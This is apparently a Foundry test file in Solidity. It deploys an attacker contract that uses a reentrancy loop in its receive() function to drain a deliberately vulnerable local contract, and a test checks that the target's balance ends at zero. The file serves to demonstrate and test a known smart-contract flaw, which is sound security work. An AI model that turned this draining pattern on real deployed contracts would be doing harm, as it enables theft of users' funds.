// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {VulnerableReentrancy} from "../src/VulnerableReentrancy.sol";
import {Vm} from "../lib/forge-std/src/Vm.sol";

contract ReentrancyAttack {
    VulnerableReentrancy public target;

    constructor(address _target) {
        target = VulnerableReentrancy(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}



contract ReentrancyTest is Test {
    VulnerableReentrancy public target;
    ReentrancyAttack public attacker;

    function setUp() public {
        target = new VulnerableReentrancy();
        attacker = new ReentrancyAttack(address(target));
        
        vm.deal(address(attacker), 10 ether);
        target.deposit{value: 10 ether}();
    }

    function testReentrancyAttack() public {
       
        // vm.prank(attacker);
        attacker.attack{value: 1 ether}();
        
    
        assertEq(address(target).balance, 0, "Target balance should be zero after reentrancy attack");
    }
}
